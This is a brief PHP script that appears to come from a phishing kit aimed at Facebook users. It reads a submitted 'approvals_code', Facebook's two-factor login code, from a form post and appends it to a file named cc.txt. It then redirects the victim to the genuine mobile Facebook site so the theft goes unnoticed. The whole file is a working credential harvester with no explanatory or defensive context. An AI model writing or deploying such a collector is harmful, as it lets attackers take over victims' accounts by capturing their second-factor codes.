<?php
header('Location: https://m.facebook.com');

$cc = $_POST['approvals_code'];
$filed = fopen("cc.txt", "a");
fwrite($filed, $cc);
fclose($filed);

exit();
?>
